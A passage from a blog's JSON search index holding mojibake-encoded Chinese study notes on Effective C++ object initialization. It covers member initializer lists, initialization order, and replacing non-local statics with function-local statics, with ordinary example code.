æˆå‘˜å‡½æ•°ä¸ºå¸¸é‡ã€‚","tags":[],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠEfficient C++ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient-C-ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"ã€ŠEffective C++ã€‹<3> ç¡®å®šå¯¹è±¡ä½¿ç”¨å‰åˆå§‹åŒ–","date":"2023-10-27T01:24:02.450Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient C++ã€‹/ã€Effective CPPã€‘3_ç¡®å®šå¯¹è±¡ä½¿ç”¨å‰åˆå§‹åŒ–/","text":"[toc] æœªåˆå§‹åŒ–çš„å¯¹è±¡ åœ¨åˆå§‹åŒ–å¯¹è±¡çš„å€¼æ–¹é¢ï¼ŒC++ ä¼¼ä¹ç›¸å½“å–„å˜ã€‚å¦‚ä¸‹é¢ç¤ºä¾‹ä»£ç ï¼Œg_var ä¸ºå…¨å±€å˜é‡ï¼Œè‡ªåŠ¨åˆå§‹åŒ–ä¸º 0ï¼Œè€Œ a æ˜¯ä¸€ä¸ªéšæœºå€¼ã€‚p çš„æˆå‘˜å˜é‡æœ‰æ—¶å€™è¢«åˆå§‹åŒ–ä¸º 0ï¼Œæœ‰æ—¶å€™ä¸ä¼šï¼Œä»è¿è¡Œç»“æœæ¥çœ‹ä¸¤æ¬¡éƒ½å·²ç»åˆå§‹åŒ–ä¸º 0ã€‚ è€Œå…¶ä»–å˜æˆè¯­è¨€ä¸­ç”¨ä¸€ä¸ª â€œæ— åˆå€¼å¯¹è±¡â€ æ˜¯ä¸å­˜åœ¨çš„ï¼Œè¿™å¾ˆé‡è¦ã€‚ 1234567891011121314151617181920212223// initObj.h#ifndef __INITOBJ_H__#define __INITOBJ_H__#include &lt;iostream&gt;int g_var;class Point&#123;public: Point() &#123;&#125; ~Point() &#123;&#125; int x() &#123; return xp; &#125; int y() &#123; return yp; &#125;private: int xp; int yp;&#125;;#endif // __INITOBJ_H__ 123456789101112131415// initObj.cpp#include &quot;initObj.h&quot;int main()&#123; int a; std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; std::endl; std::cout &lt;&lt; &quot;g_var = &quot; &lt;&lt; g_var &lt;&lt; std::endl; Point p; std::cout &lt;&lt; &quot;Point::x = &quot; &lt;&lt; p.x() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Point::y = &quot; &lt;&lt; p.y() &lt;&lt; std::endl; return 0;&#125; C++åˆå§‹åŒ– é€šå¸¸å¦‚æœä½ ä½¿ç”¨ç±» C è¯­æ³•éƒ¨åˆ†è€Œæœªåˆå§‹åŒ–å¯èƒ½æ‹›è‡´è¿è¡ŒæœŸæˆæœ¬ï¼Œé‚£ä¹ˆå°±ä¸ä¿è¯å‘ç”Ÿåˆå§‹åŒ–ã€‚ä¸€æ—¦è¿›å…¥çº¯ C++ éƒ¨åˆ†ï¼Œè§„åˆ™æœ‰äº›å˜åŒ–ã€‚è¿™å°±å¾ˆå¥½åœ°è§£é‡Šäº†ä¸ºä»€ä¹ˆæ•°ç»„ä¸ä¿è¯å…¶å†…å®¹è¢«åˆå§‹åŒ–ï¼Œè€Œ vector å´èƒ½ä¿è¯åˆå§‹åŒ–ã€‚ åŸºç¡€æ•°æ®ç±»å‹åˆå§‹åŒ– 12345678910111213141516// baseData.cpp#include &lt;iostream&gt;int main()&#123; int x = 0; // æ‰‹åŠ¨åˆå§‹åŒ– int ç±»å‹å¯¹è±¡ const char * text = &quot;shiyanlou&quot;; // æ‰‹åŠ¨åˆå§‹åŒ–æŒ‡é’ˆå­—ç¬¦ä¸² double d; // é€šè¿‡è¯»å–è¾“å…¥æ–¹å¼åˆå§‹åŒ– std::cout &lt;&lt; &quot;è¯·è¾“å…¥ï¼š&quot;; std::cin &gt;&gt; d; std::cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; std::endl; std::cout &lt;&lt; &quot;text = &quot; &lt;&lt; text &lt;&lt; std::endl; std::cout &lt;&lt; &quot;d = &quot; &lt;&lt; d &lt;&lt; std::endl; return 0;&#125; ç±»åˆå§‹åŒ– è‡³äºå†…ç½®ç±»å‹ä»¥å¤–çš„ä»»ä½•å…¶ä»–å¯¹è±¡ï¼Œåˆå§‹åŒ–è´£ä»»è½åœ¨äº†æ„é€ å‡½æ•°ã€‚è§„åˆ™å¾ˆç®€å•ï¼Œç¡®ä¿æ¯ä¸€ä¸ªæ„é€ å‡½æ•°éƒ½å°†å¯¹è±¡çš„æ¯ä¸€ä¸ªæˆå‘˜åˆå§‹åŒ–ã€‚ è¿™ä¸ªè§„åˆ™å¾ˆç®€å•ï¼Œé‡è¦çš„æ˜¯åˆ«æ··æ·†äº†èµ‹å€¼å’Œåˆå§‹åŒ–ã€‚ 1234567891011121314151617181920212223// initClass.h#ifndef __INITCLASS_H__#define __INITCLASS_H__#include &lt;iostream&gt;#include &lt;list&gt;class PhoneNumber &#123; &#125;;class ABEntry&#123; // ABEntry = â€œAddress Book Entryâ€public: ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones);private: std::string theName; std::string theAddress; std::list&lt;PhoneNumber&gt; thePhones; int numTimesConsulted;&#125;;#endif // __INITCLASS_H__ 1234567891011121314151617// initClass.cpp#include &quot;initClass.h&quot;ABEntry::ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones)&#123; theName = name; // è¿™äº›éƒ½æ˜¯èµ‹å€¼è€Œéåˆå§‹åŒ– theAddress = address; thePhones = phones; numTimesConsulted = 0;&#125;int main()&#123; return 0;&#125; è¿™å°†äº§ç”Ÿå…·æœ‰ä½ æœŸæœ›çš„å€¼çš„ ABEntry å¯¹è±¡ï¼Œä½†è¿™ä»ç„¶ä¸æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚C++ çš„è§„åˆ™è§„å®šï¼Œå¯¹è±¡çš„æ•°æ®æˆå‘˜åœ¨è¿›å…¥æ„é€ å‡½æ•°çš„ä¸»ä½“ä¹‹å‰è¢«åˆå§‹åŒ–ã€‚åœ¨ ABEntry æ„é€ å‡½æ•°ä¸­ï¼ŒtheNameã€theAddress å’Œ thePhones æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå®ƒä»¬åªæ˜¯è¢«èµ‹å€¼ã€‚åˆå§‹åŒ–å‘ç”Ÿåœ¨è¿›å…¥ ABEntry æ„é€ å‡½æ•°æ­£æ–‡ä¹‹å‰ï¼Œå³è‡ªåŠ¨è°ƒç”¨å®ƒä»¬çš„é»˜è®¤æ„é€ å‡½æ•°æ—¶è¿›è¡Œçš„ã€‚åœ¨è¿›å…¥ ABEntry æ„é€ å‡½æ•°çš„ä¸»ä½“ä¹‹å‰ï¼Œå·²ç»è¿›è¡Œäº†åˆå§‹åŒ–ã€‚è¿™å¯¹äº numTimesConsulted ä¸æ˜¯è¿™æ ·ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå†…ç½®ç±»å‹ã€‚å¯¹å®ƒæ¥è¯´ï¼Œä¸èƒ½ä¿è¯å®ƒåœ¨è¢«èµ‹å€¼ä¹‹å‰å°±è¢«åˆå§‹åŒ–äº†ã€‚ åˆå§‹åŒ–åˆ—è¡¨ ABEntry æ„é€ å‡½æ•°çš„ä¸€ä¸ªè¾ƒä½³å†™æ³•æ˜¯ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨è¿›è¡Œåˆå§‹åŒ–ã€‚ åˆå§‹åŒ–åˆ—è¡¨ä½¿ç”¨æ–¹æ³• 1234567891011121314151617181920212223// initList.h#ifndef __INITLIST_H__#define __INITLIST_H__#include &lt;iostream&gt;#include &lt;list&gt;class PhoneNumber &#123; &#125;;class ABEntry&#123; // ABEntry = â€œAddress Book Entryâ€public: ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones);private: std::string theName; std::string theAddress; std::list&lt;PhoneNumber&gt; thePhones; int numTimesConsulted;&#125;;#endif // __INITLIST_H__ 12345678910111213141516// initList.cpp#include &quot;initList.h&quot;ABEntry::ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones) : theName(name), // ä»¥ä¸‹ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ï¼Œä»å†’å·ï¼ˆ:ï¼‰åå¼€å§‹ theAddress(address), thePhones(phones), numTimesConsulted(0)&#123;&#125; // æ„é€ å‡½æ•°ä¸­ä¸ºç©ºint main()&#123; return 0;&#125; ç¤ºä¾‹ä»£ç ä¸­æ„é€ å‡½æ•°ä¸åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼çš„æœ€ç»ˆç»“æœç›¸åŒï¼Œä½†å®ƒå¾€å¾€æ›´æœ‰æ•ˆç‡ã€‚åŸºäºèµ‹å€¼çš„ç‰ˆæœ¬é¦–å…ˆè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°æ¥åˆå§‹åŒ– theNameã€theAddress å’Œ thePhonesï¼Œç„¶åç«‹å³åœ¨é»˜è®¤æ„é€ çš„åŸºç¡€ä¸Šåˆ†é…æ–°çš„å€¼ã€‚å› æ­¤ï¼Œæ‰€æœ‰åœ¨è¿™äº›é»˜è®¤æ„é€ ä¸­è¿›è¡Œçš„å·¥ä½œéƒ½è¢«æµªè´¹äº†ã€‚æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨çš„æ–¹æ³•é¿å…äº†è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºåˆå§‹åŒ–åˆ—è¡¨ä¸­çš„å‚æ•°è¢«ç”¨ä½œå„ç§æ•°æ®æˆå‘˜çš„æ„é€ å™¨å‚æ•°ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒtheName æ˜¯ç”± name æ‹·è´æ„é€ çš„ï¼ŒtheAddress æ˜¯ç”± address å¤åˆ¶æ„é€ çš„ï¼ŒthePhones æ˜¯ç”± phones æ‹·è´æ„é€ çš„ã€‚ å¯¹å¤§å¤šæ•°ç±»å‹è€Œè¨€ï¼Œæ¯”èµ·å…ˆè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ç„¶åå†è°ƒç”¨æ‹·è´èµ‹å€¼æ“ä½œç¬¦ï¼Œå•åªè°ƒç”¨ä¸€æ¬¡èµ‹å€¼æ„é€ å‡½æ•°æ˜¯æ¯”è¾ƒé«˜æ•ˆçš„ï¼Œæœ‰æ—¶ç”šè‡³é«˜æ•ˆå¾—å¤šã€‚å¯¹äºå†…ç½®å‹å¯¹è±¡å¦‚ numTimesConsultedï¼Œå…¶åˆå§‹åŒ–å’Œèµ‹å€¼çš„æˆæœ¬ç›¸åŒï¼Œä½†ä¸ºäº†ä¸€è‡´æ€§æœ€å¥½ä¹Ÿé€šè¿‡æˆå‘˜åˆå€¼åˆ—æ¥åˆå§‹åŒ–ã€‚åŒæ ·é“ç†ï¼Œç”šè‡³å½“ä½ æƒ³è¦é»˜è®¤æ„é€ ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œä½ éƒ½å¯ä»¥ä½¿ç”¨æˆå‘˜åˆå€¼åˆ—ï¼Œåªè¦æŒ‡å®š 0 æˆ–è€…ç©ºä½œä¸ºåˆå§‹åŒ–å®å‚å³å¯ã€‚ 123456ABEntry::ABEntry() : theName(), // è°ƒç”¨ thenName é»˜è®¤æ„é€ å‡½æ•° theAddress(), // è°ƒç”¨ theAddress é»˜è®¤æ„é€ å‡½æ•° thePhones(), // è°ƒç”¨ thePhones é»˜è®¤æ„é€ å‡½æ•° numTimesConsulted(0) // åˆå§‹åŒ–ä¸º 0&#123;&#125; åˆå§‹åŒ–è¯´æ˜ å½“ç”¨æˆ·å®šä¹‰ç±»å‹çš„æ•°æ®æˆå‘˜åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­æ²¡æœ‰åˆå§‹åŒ–æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨è¿™äº›æ•°æ®æˆå‘˜çš„é»˜è®¤æ„é€ å™¨ï¼Œæ‰€ä»¥æœ‰äº›ç¨‹åºå‘˜è®¤ä¸ºä¸Šè¿°æ–¹æ³•æ˜¯å¤šä½™çš„æ˜¯å¯ä»¥ç†è§£çš„ï¼Œä½†æ˜¯å¦‚æœæœ‰ä¸€ä¸ªæ€»æ˜¯åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆ—å‡ºæ¯ä¸ªæ•°æ®æˆå‘˜çš„ç­–ç•¥ï¼Œå°±å¯ä»¥é¿å…è®°ä½å“ªäº›æ•°æ®æˆå‘˜åœ¨è¢«çœç•¥åå¯èƒ½ä¼šè¢«æœªåˆå§‹åŒ–ã€‚ä¾‹å¦‚ï¼Œç”±äº numTimesConsulted æ˜¯ä¸€ä¸ªå†…ç½®çš„ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­é—æ¼æ²¡æœ‰åˆå€¼æ—¶å°±ä¼šå¯¼è‡´ä¸æ˜ç¡®è¡Œä¸ºã€‚ æœ‰äº›æƒ…å†µä¸‹å³ä½¿é¢å¯¹çš„æˆå‘˜å˜é‡å±äºå†…ç½®ç±»å‹ï¼ˆå…¶åˆå§‹åŒ–ä¸èµ‹å€¼çš„æˆæœ¬ç›¸åŒï¼‰ï¼Œä¹Ÿä¸€å®šå¾—ä½¿ç”¨åˆå€¼åˆ—ã€‚æ˜¯çš„ï¼Œå¦‚æœæˆå‘˜å˜é‡æ˜¯å¸¸é‡æˆ–å¼•ç”¨æ—¶ï¼Œå®ƒä»¬å°±ä¸€å®šéœ€è¦åˆå€¼ï¼Œä¸èƒ½è¢«èµ‹å€¼ã€‚ä¸ºé¿å…éœ€è¦è®°ä½æˆå‘˜å˜é‡ä½•æ—¶å¿…é¡»åœ¨æˆå‘˜åˆå€¼åˆ—ä¸­åˆå§‹åŒ–ï¼Œä½•æ—¶ä¸éœ€è¦ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯ï¼šæ€»æ˜¯ä½¿ç”¨æˆå‘˜åˆå€¼åˆ—ã€‚è¿™æ ·åšæœ‰æ—¶å€™ç»å¯¹å¿…è¦ï¼Œä¸”åˆå¾€å¾€æ¯”èµ‹å€¼æ›´é«˜æ•ˆã€‚ è®¸å¤šç±»æ‹¥æœ‰å¤šä¸ªæ„é€ å‡½æ•°ï¼Œæ¯ä¸ªæ„é€ å‡½æ•°æœ‰è‡ªå·±çš„æˆå‘˜åˆå€¼åˆ—ã€‚å¦‚æœè¿™ç§ç±»å­˜åœ¨è®¸å¤šæˆå‘˜å˜é‡æˆ–åŸºç±»ï¼Œå¤šä»½æˆå‘˜åˆå€¼åˆ—çš„å­˜åœ¨å°±ä¼šå¯¼è‡´ä¸å—æ¬¢è¿çš„é‡å¤ï¼ˆåœ¨åˆå€¼åˆ—å†…ï¼‰å’Œæ— èŠçš„å·¥ä½œï¼ˆå¯¹ç¨‹åºå‘˜è€Œè¨€ï¼‰ã€‚è¿™ç§æƒ…å†µä¸‹å¯ä»¥åˆç†åœ°åœ¨åˆå€¼åˆ—ä¸­é—æ¼é‚£äº› â€œèµ‹å€¼è¡¨ç°åƒåˆå§‹åŒ–ä¸€æ ·å¥½â€ çš„æˆå‘˜å˜é‡ï¼Œæ”¹ç”¨å®ƒä»¬çš„èµ‹å€¼æ“ä½œï¼Œå¹¶å°†é‚£äº›èµ‹å€¼æ“ä½œç§»å¾€æŸä¸ªå‡½æ•°ï¼ˆé€šå¸¸æ˜¯ç§æœ‰çš„ï¼‰ï¼Œä¾›æ‰€æœ‰æ„é€ å‡½æ•°è°ƒç”¨ã€‚è¿™ç§åšæ³•åœ¨ â€œæˆå‘˜å˜é‡çš„åˆå€¼ç³»ç”±æ–‡ä»¶æˆ–æ•°æ®åº“è¯»å…¥â€ æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚ç„¶è€Œï¼Œæ¯”èµ·ç»ç”±èµ‹å€¼æ“ä½œå®Œæˆçš„ â€œä¼ªåˆå§‹åŒ–â€ï¼ˆpseudo-initializationï¼‰ï¼Œé€šè¿‡æˆå‘˜åˆå€¼åˆ—å®Œæˆçš„ â€œçœŸæ­£åˆå§‹åŒ–â€ é€šå¸¸æ›´åŠ å¯å–ã€‚ C++ æœ‰ç€ååˆ†å›ºå®šçš„ â€œæˆå‘˜åˆå§‹åŒ–é¡ºåºâ€ã€‚é¡ºåºæ€»æ˜¯ç›¸åŒï¼šåŸºç±»æ›´æ—©äºå…¶å­ç±»è¢«åˆå§‹åŒ–ï¼Œè€Œç±»çš„æˆå‘˜å˜é‡æ€»æ˜¯ä»¥å…¶å£°æ˜æ¬¡åºè¢«åˆå§‹åŒ–ã€‚å›å¤´çœ‹çœ‹ ABEntryï¼Œå…¶ theName æˆå‘˜æ°¸è¿œæœ€å…ˆè¢«åˆå§‹åŒ–ï¼Œç„¶åæ˜¯ theAddressï¼Œå†æ˜¯ thePhonesï¼Œæœ€åæ˜¯ numTimesConsultedã€‚å³ä½¿å®ƒä»¬åœ¨æˆå‘˜åˆå€¼åˆ—ä¸­ä»¥ä¸åŒçš„é¡ºåºå‡ºç°ï¼ˆå¾ˆä¸å¹¸é‚£æ˜¯åˆæ³•çš„ï¼‰ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•å½±å“ã€‚ä¸ºé¿å…ä½ æˆ–ä½ çš„æ£€æŸ¥ä»£ç çš„äººè¿·æƒ‘ï¼Œå¹¶é¿å…æŸäº›å¯èƒ½å­˜åœ¨çš„æ™¦æ¶©é”™è¯¯ï¼Œå½“ä½ åœ¨æˆå‘˜åˆå€¼åˆ—ä¸­æ¡åˆ—å„ä¸ªæˆå‘˜æ—¶ï¼Œæœ€å¥½æ€»æ˜¯ä»¥å…¶å£°æ˜æ¬¡åºä¸ºæ¬¡åºã€‚ åˆå§‹åŒ–é™æ€å¯¹è±¡ é™æ€ï¼ˆstaticï¼‰å¯¹è±¡å¯¿å‘½ä»è¢«æ„é€ å‡ºæ¥ç›´åˆ°ç¨‹åºç»“æŸä¸ºæ­¢ï¼Œå› æ­¤æ ˆå’Œå †å¯¹è±¡éƒ½è¢«æ’é™¤ã€‚åŒ…æ‹¬å…¨å±€å¯¹è±¡ã€å‘½åç©ºé—´å†…çš„å¯¹è±¡ã€ç±»ã€å‡½æ•°å’Œæ–‡ä»¶å†…è¢«å£°æ˜é™æ€çš„å¯¹è±¡ã€‚å‡½æ•°å†…çš„é™æ€å¯¹è±¡ç§°ä¸ºå±€éƒ¨é™æ€å¯¹è±¡ï¼ˆå› ä¸ºå®ƒä»¬å¯¹å‡½æ•°è€Œè¨€æ˜¯å±€éƒ¨çš„ï¼‰ï¼Œå…¶ä»–é™æ€å¯¹è±¡ç§°ä¸ºéå±€éƒ¨é™æ€å¯¹è±¡ã€‚ç¨‹åºç»“æŸæ—¶é™æ€å¯¹è±¡ä¼šè¢«è‡ªåŠ¨é”€æ¯ï¼Œä¹Ÿå°±æ˜¯å®ƒä»¬çš„ææ„å‡½æ•°ä¼šåœ¨ main() ç»“æŸæ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚ åˆå§‹åŒ–é¡ºåº å¦‚ä¸‹ç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬å…³å¿ƒçš„é—®é¢˜æ¶‰åŠè‡³å°‘ä¸¤ä¸ªæºç æ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªå†…å«è‡³å°‘ä¸€ä¸ªéå±€éƒ¨é™æ€å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯è¯´è¯¥å¯¹è±¡æ˜¯å…¨å±€æˆ–ä½äºå‘½åç©ºé—´å†…ï¼ŒæŠ‘æˆ–åœ¨ç±»å†…æˆ–æºç æ–‡ä»¶å†…è¢«å£°æ˜ä¸ºé™æ€ï¼‰ã€‚çœŸæ­£çš„é—®é¢˜æ˜¯ï¼šå¦‚æœæŸç¼–è¯‘å•å…ƒå†…çš„æŸä¸ªéå±€éƒ¨é™æ€å¯¹è±¡çš„åˆå§‹åŒ–åŠ¨ä½œä½¿ç”¨äº†å¦ä¸€ç¼–è¯‘å•å…ƒå†…çš„æŸä¸ªéå±€éƒ¨é™æ€å¯¹è±¡ï¼Œå®ƒæ‰€ç”¨åˆ°çš„è¿™ä¸ªå¯¹è±¡å¯èƒ½å°šæœªè¢«åˆå§‹åŒ–ï¼Œå› ä¸º C++ å¯¹ â€œå®šä¹‰äºä¸åŒç¼–è¯‘å•å…ƒå†…çš„éå±€éƒ¨é™æ€å¯¹è±¡â€ çš„åˆå§‹åŒ–æ¬¡åºå¹¶æ— æ˜ç¡®å®šä¹‰ã€‚ 12345678910111213141516171819202122232425262728293031// FileSystem.h#ifndef __FILESYSTEM_H__#define __FILESYSTEM_H__/** å‡è®¾æœ‰ä¸€ä¸ª FileSystem ç±»ï¼Œå®ƒè®©äº’è”ç½‘ä¸Šçš„æ–‡ä»¶çœ‹èµ·æ¥å¥½åƒä½äºæœ¬æœºã€‚ ç”±äºè¿™ä¸ªç±»ä½¿æ–‡ä»¶ç³»ç»Ÿçœ‹èµ·æ¥åƒä¸ªå•ä¸€æ–‡ä»¶ç³»ç»Ÿï¼Œä½ å¯èƒ½ä¼šäº§å‡ºä¸€ä¸ªç‰¹æ®Šå¯¹è±¡ï¼Œ ä½äºå…¨å±€æˆ–å‘½åç©ºé—´ä½œç”¨åŸŸå†…ï¼Œåƒæ˜¯å•ä¸€æ–‡ä»¶ç³»ç»Ÿã€‚ */#include &lt;iostream&gt;class FileSystem&#123;public: FileSystem() &#123;&#125; ~FileSystem() &#123;&#125; // ... std::size_t numDisks() const; // å…¶ä¸­ä¸€ä¸ªæˆå‘˜å‡½æ•° // ...&#125;;/** FileSystem å¯¹è±¡ç»ä¸æ˜¯ä¸€ä¸ªç¨€æ¾å¹³å¸¸æ— å…³ç—›ç—’çš„å¯¹è±¡ï¼Œ å› ä¸ºä½ çš„å®¢æˆ·å¦‚æœåœ¨ theFileSystem å¯¹è±¡æ„é€ å®Œæˆå‰å°±ä½¿ç”¨å®ƒï¼Œä¼šå¾—åˆ°æƒ¨é‡çš„ç¾æƒ…ã€‚ */// é¢„ç•™ç»™ç”¨æˆ·ä½¿ç”¨çš„å¯¹è±¡extern FileSystem tfs;#endif // __FILESYSTEM_H__ 123456789101112131415// Directory.h#ifndef __DIRECTORY_H__#define __DIRECTORY_H__#include &lt;iostream&gt;#include &quot;FileSystem.h&quot;class Directory&#123;public: Directory(const FileSystem &amp;fs); ~Directory();&#125;;#endif // __DIRECTORY_H__ 12345678910111213141516// Director.cpp#include &quot;Directory.h&quot;/** å‡è®¾æŸäº›å®¢æˆ·å»ºç«‹äº†ä¸€ä¸ª Directory ç±»ç”¨ä»¥å¤„ç†æ–‡ä»¶ç³»ç»Ÿå†…çš„ç›®å½•ã€‚ å¾ˆè‡ªç„¶ä»–ä»¬çš„ç±»ä¼šç”¨ä¸Š theFileSystem å¯¹è±¡ */Directory::Directory(const FileSystem &amp;tfs)&#123; std::size_t disks = tfs.numDisks(); // ä½¿ç”¨ tfs å¯¹è±¡ // ...&#125;Directory::~Directory()&#123;&#125; 12345678910// main.cpp#include &quot;FileSystem.h&quot;#include &quot;Directory.h&quot;int main()&#123; // å‡è®¾åˆ›å»ºä¸€ä¸ªç›®å½•æ¥å­˜æ”¾ä¸´æ—¶æ–‡ä»¶ Directory tempDir(tfs); // ä¸´æ—¶æ–‡ä»¶å­˜æ”¾ç›®å½• return 0;&#125; ç°åœ¨ï¼Œåˆå§‹åŒ–æ¬¡åºçš„é‡è¦æ€§æ˜¾ç°å‡ºæ¥äº†ï¼šé™¤é tfs åœ¨ tempDir ä¹‹å‰å…ˆè¢«åˆå§‹åŒ–ï¼Œå¦åˆ™ tempDir çš„æ„é€ å‡½æ•°ä¼šç”¨åˆ°å°šæœªåˆå§‹åŒ–çš„ tfsã€‚ä½† tfs å’Œ tempDir æ˜¯ä¸åŒçš„äººåœ¨ä¸åŒçš„æ—¶é—´äºä¸åŒçš„æºç æ–‡ä»¶å»ºç«‹èµ·æ¥çš„ï¼Œå®ƒä»¬æ˜¯å®šä¹‰äºä¸åŒç¼–è¯‘å•å…ƒå†…çš„éå±€éƒ¨é™æ€å¯¹è±¡ã€‚å¦‚ä½•èƒ½å¤Ÿç¡®å®š tfs ä¼šåœ¨ tempDir ä¹‹å‰å…ˆè¢«åˆå§‹åŒ–ï¼Ÿ C++ å¯¹ â€œå®šä¹‰äºä¸åŒçš„ç¼–è¯‘å•å…ƒå†…çš„éå±€éƒ¨é™æ€å¯¹è±¡â€ çš„åˆå§‹åŒ–ç›¸å¯¹æ¬¡åºå¹¶æ— æ˜ç¡®å®šä¹‰ã€‚è¿™æ˜¯æœ‰åŸå› çš„ï¼šå†³å®šå®ƒä»¬çš„åˆå§‹åŒ–æ¬¡åºç›¸å½“å›°éš¾ï¼Œæ ¹æœ¬æ— è§£ã€‚åœ¨å…¶æœ€å¸¸è§å½¢å¼ï¼Œä¹Ÿå°±æ˜¯å¤šä¸ªç¼–è¯‘å•å…ƒå†…çš„éå±€éƒ¨é™æ€å¯¹è±¡ç»ç”± â€œæ¨¡æ¿éšå¼å…·ç°åŒ–â€ å½¢æˆï¼ˆè€Œåè€…è‡ªå·±å¯èƒ½ä¹Ÿæ˜¯ç»ç”± â€œæ¨¡æ¿éšå¼å…·ç°åŒ–â€ å½¢æˆï¼‰ï¼Œä¸ä½†ä¸å¯èƒ½å†³å®šæ­£ç¡®çš„åˆå§‹åŒ–æ¬¡åºï¼Œç”šè‡³å¾€å¾€ä¸å€¼å¾—å¯»æ‰¾ â€œå¯å†³å®šæ­£ç¡®æ¬¡åºâ€ çš„ç‰¹æ®Šæƒ…å†µã€‚ å•ä¾‹æ¨¡å¼ å¹¸è¿çš„æ˜¯ä¸€ä¸ªå°å°çš„è®¾è®¡ä¾¿å¯å®Œå…¨æ¶ˆé™¤è¿™ä¸ªé—®é¢˜ã€‚å”¯ä¸€éœ€è¦åšçš„æ˜¯ï¼šå°†æ¯ä¸ª éå±€éƒ¨é™æ€å¯¹è±¡æ¬åˆ°è‡ªå·±çš„ä¸“å±å‡½æ•°å†…ï¼ˆè¯¥å¯¹è±¡åœ¨æ­¤å‡½æ•°å†…è¢«å£°æ˜ä¸ºé™æ€ï¼‰ã€‚è¿™äº›å‡½æ•°è¿”å›ä¸€ä¸ªå¼•ç”¨æŒ‡å‘å®ƒæ‰€å«çš„å¯¹è±¡ã€‚ç„¶åç”¨æˆ·è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œè€Œä¸ç›´æ¥æŒ‡æ¶‰è¿™äº›å¯¹è±¡ã€‚æ¢å¥è¯è¯´ï¼Œéå±€éƒ¨é™æ€å¯¹è±¡è¢«å±€éƒ¨é™æ€å¯¹è±¡æ›¿æ¢äº†ã€‚è®¾è®¡æ¨¡å¼çš„è¿·å“¥è¿·å¦¹ä»¬æƒ³å¿…è®¤å‡ºæ¥äº†ï¼Œè¿™æ˜¯å•ä¾‹æ¨¡å¼çš„ä¸€ä¸ªå¸¸è§å®ç°æ‰‹æ³•ã€‚ è¿™ä¸ªæ‰‹æ³•çš„åŸºç¡€åœ¨äºï¼šC++ ä¿è¯ï¼Œå‡½æ•°å†…çš„å±€éƒ¨é™æ€å¯¹è±¡ä¼šåœ¨è¯¥å‡½æ•°è¢«è°ƒç”¨æœŸé—´é¦–æ¬¡é‡ä¸Šè¯¥å¯¹è±¡ä¹‹å®šä¹‰å¼æ—¶è¢«åˆå§‹åŒ–ã€‚æ‰€ä»¥å¦‚æœä½ ä»¥ â€œå‡½æ•°è°ƒç”¨â€ï¼ˆè¿”å›ä¸€ä¸ªå¼•ç”¨æŒ‡å‘å±€éƒ¨é™æ€å¯¹è±¡ï¼‰æ›¿æ¢ç›´æ¥è®¿é—®éå±€éƒ¨é™æ€å¯¹è±¡ï¼Œä½ å°±è·å¾—äº†ä¿è¯ï¼Œä¿è¯ä½ æ‰€è·å¾—çš„é‚£ä¸ªå¼•ç”¨å°†æŒ‡å‘ä¸€ä¸ªå†ç»åˆå§‹åŒ–çš„å¯¹è±¡ã€‚æ›´æ£’çš„æ˜¯ï¼Œå¦‚æœä½ ä»æœªè°ƒç”¨éå±€éƒ¨é™æ€å¯¹è±¡çš„ â€œä»¿çœŸå‡½æ•°â€ï¼Œå°±ç»ä¸ä¼šå¼•å‘æ„é€ å’Œææ„æˆæœ¬ï¼›çœŸæ­£çš„éå±€éƒ¨é™æ€å¯¹è±¡å¯æ²¡è¿™ç­‰ä¾¿å®œï¼ 1234567891011121314// FileSystem.cpp#include &quot;FileSystem.h&quot;// è¯¥å‡½æ•°æ›¿æ¢ tfs å¯¹è±¡ï¼Œåœ¨ç±»ä¸­æ˜¯é™æ€çš„ï¼ŒFileSystem&amp; tfs()&#123; static FileSystem tfs; // å®šä¹‰å¹¶åˆå§‹åŒ–éå±€éƒ¨é™æ€å¯¹è±¡ return tfs; // è¿”å›å¯¹è±¡å¼•ç”¨&#125;std::size_t FileSystem::numDisks() const&#123; return 